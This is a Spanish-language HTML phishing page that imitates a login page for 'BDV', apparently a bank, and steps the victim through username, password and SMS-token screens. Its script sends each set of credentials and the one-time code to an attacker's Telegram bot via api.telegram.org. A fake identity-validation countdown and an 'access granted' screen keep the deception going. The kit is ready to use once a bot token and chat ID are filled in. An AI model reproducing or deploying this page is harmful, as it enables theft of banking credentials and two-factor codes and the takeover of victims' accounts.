<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión - BDV</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f5f5f5;
            background-image: url('Img/bg.png');
            background-size:50 contain;
            background-position: center;
            background-repeat:10 no-repeat;
            background-attachment: fixed;
        }
        .container {
            width: 250px;
            margin: 100px auto;
            padding: 20px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 { color: #333; margin-bottom: 20px; }

        .input-container {
            position: relative;
            width: 40%;
            margin: 20px 0;
        }
        .input-container label {
            font-size: 15px; 
            color: #a11d40; 
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        .input-container input {
            width: 220%;
            padding: 10px;
            border: none;
            border-bottom: 2px solid #a11d40; 
            background-color: #f9f9f9; 
            font-size: 20px;
            outline: none;
            color: #333;
        }
        .input-container input:focus {
            border-bottom: 2px solid #a11d40;
            background-color: #fff;
        }

        button { 
            width: 40%; 
            padding: 13px; 
            background: #3498db; 
            color: white; 
            border: none; 
            border-radius: 2px; 
            cursor: pointer; 
            font-size: 16px; 
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }
        button:disabled {
            background: #ccc;
        }
        button:hover:not(:disabled) { 
            background-color: #2980b9; 
        }

        .hidden { display: none; }
        .timer { font-size: 20px; font-weight: bold; color: black; }
        img { width: 250px; height: auto; display: block; margin: 0 auto; }

        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1.5s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <div id="step1" class="container">
        <img src="img/logotipins.png" alt="">
        <div class="input-container">
            <label for="username">Usuario *</label>
            <input type="text" id="username" placeholder="Usuario *" oninput="validateUser()"> 
        </div>
        <button id="btnEntrar" onclick="nextStep(1)" disabled>Entrar</button> 
    </div>

    <div id="step2" class="container hidden">
        <h3>Introduce tu contraseña</h3>
        <div class="input-container">
            <label for="password">Contraseña *</label>
            <input type="password" id="password" placeholder="Contraseña *">
        </div>
        <button onclick="sendLoginData()">Continuar</button>
    </div>

    <div id="step3" class="container hidden">
        <h2>Estamos validando tu identidad</h2>
        <p>Por favor, ten cerca tus instrumentos de seguridad</p>
        <div class="loader"></div> 
        <p class="timer" id="countdown">3</p>
    </div>

    <div id="step4" class="container hidden">
        <h3>Introduce el Token enviado por SMS</h3>
        <div class="input-container">
            <input type="text" id="token" placeholder="Código *">
        </div>
        <button onclick="sendTokenData()">Continuar</button>
    </div>

    <div id="step5" class="container hidden">
        <h2>¡Acceso concedido!</h2>
        <p>Bienvenido, tu identidad ha sido verificada correctamente.</p>
        <button onclick="finishLogin()">Finalizar</button>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "";  
        const TELEGRAM_CHAT_ID = "";  

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
            fetch(url)
                .then(response => response.json())
                .then(data => console.log("Mensaje enviado:", data))
                .catch(error => console.error("Error enviando a Telegram:", error));
        }

        function nextStep(step) {
            document.getElementById(`step${step}`).classList.add("hidden");
            document.getElementById(`step${step + 1}`).classList.remove("hidden");

            if (step === 2) {
                startCountdown();
            }
        }

        function startCountdown() {
            let timeLeft = 3;
            const timerElement = document.getElementById("countdown");
            const interval = setInterval(() => {
                timeLeft--;
                timerElement.textContent = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    nextStep(3); 
                }
            }, 1000);
        }

        function sendLoginData() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();

            if (!username || !password) {
                alert("Por favor, completa todos los campos.");
                return;
            }

            const message = `🔐 *Nuevo Inicio de Sesión*\n👤 Usuario: ${username}\n🔑 Contraseña: ${password}`;
            sendToTelegram(message);
            nextStep(2);
        }

        function sendTokenData() {
            const token = document.getElementById("token").value.trim();

            if (!token) {
                alert("Por favor, introduce el código.");
                return;
            }

            const message = `🔢 *Código de Verificación*\n📲 Token: ${token}`;
            sendToTelegram(message);
            nextStep(4); // Ir al Step 5
        }

        function finishLogin() {
            alert("Proceso completado. ¡Bienvenido!");
            window.location.href = "dashboard.html"; // Redirigir a otra página si es necesario
        }

        function validateUser() {
            const username = document.getElementById("username").value.trim();
            const button = document.getElementById("btnEntrar");

            if (username !== "") {
                button.disabled = false;
            } else {
                button.disabled = true;
            }
        }
    </script>

</body>
</html>
